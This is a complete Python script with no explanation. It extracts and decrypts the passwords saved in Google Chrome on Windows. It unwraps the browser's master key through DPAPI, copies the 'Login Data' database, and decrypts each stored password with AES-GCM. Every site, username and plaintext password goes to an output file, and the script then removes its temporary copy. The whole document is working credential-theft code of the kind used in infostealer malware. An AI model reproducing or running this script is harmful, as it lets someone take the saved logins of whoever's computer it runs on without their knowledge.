import os
import json
import base64
import sqlite3
import win32crypt
import shutil
import sys
from Crypto.Cipher import AES
from datetime import datetime, timedelta
def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""
def main(output_file):
    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
    
    with open(output_file, "w") as f:
        for row in cursor.fetchall():
            origin_url = row[0]
            action_url = row[1]
            username = row[2]
            password = decrypt_password(row[3], key)
            date_created = row[4]
            date_last_used = row[5]
            
            if username or password:
                print(f"Origin URL: {origin_url}", file=f)
                print(f"Action URL: {action_url}", file=f)
                print(f"Username: {username}", file=f)
                print(f"Password: {password}", file=f)
            else:
                continue
 
            if date_created != 86400000000 and date_created:
                print(f"Creation date: {str(get_chrome_datetime(date_created))}", file=f)
            if date_last_used != 86400000000 and date_last_used:
                print(f"Last Used: {str(get_chrome_datetime(date_last_used))}", file=f)
            
            print("=" * 50, file=f)
    
    cursor.close()
    db.close()
 
    try:
        os.remove(filename)
    except:
        pass
 
if __name__ == "__main__":
    output_file = sys.argv[1]
    main(output_file)
